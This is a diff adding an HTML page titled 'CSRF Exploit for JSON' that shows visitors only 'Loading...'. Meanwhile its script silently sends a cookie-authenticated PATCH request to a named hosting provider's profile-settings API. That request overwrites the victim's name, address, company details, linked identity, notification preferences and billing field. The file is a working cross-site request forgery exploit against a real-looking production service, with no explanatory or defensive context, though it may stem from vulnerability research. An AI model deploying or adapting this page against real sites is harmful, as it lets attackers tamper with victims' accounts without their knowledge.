@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit for JSON</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+
+    <script>
+        // The JSON payload to send
+        const csrfPayload = {
+            personal: {
+                firstname: "Mohamed",
+                lastname: "Ali",
+                phone: "1234567890",
+                email: "hacker@gmail.com", // Can't be changed
+                network: {
+                    type: "facebook",
+                    identity: "new_identity"
+                },
+                address: {
+                    line_1: "New Address Line 1",
+                    line_2: "New Address Line 2",
+                    city: "Alexandria",
+                    state: "NewState",
+                    country: "EG",
+                    zip: "12345"
+                }
+            },
+            company: {
+                name: "New Company Name",
+                vat: "123456789",
+                phone: "9876543210",
+                address: {
+                    line_1: "Company Address 1",
+                    line_2: "Company Address 2",
+                    city: "Giza",
+                    state: "State",
+                    country: "EG",
+                    zip: "54321"
+                }
+            },
+            notifications: {
+                general: false,
+                details: false,
+                services: true,
+                billing: false,
+                support: true
+            },
+            billing: "UPDATED"
+        };
+
+        // Send the CSRF request
+        fetch("https://my.ishosting.com/api/settings/profile", {
+            method: "PATCH", // The Metod of Request
+            credentials: "include", // Ensures session cookies are sent
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(csrfPayload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Request sent successfully:", response);
+            } else {
+                console.error("Failed request:", response);
+            }
+        })
+        .catch(error => {
+            console.error("Error sending request:", error);
+        });
+    </script>
+</body>
+</html>
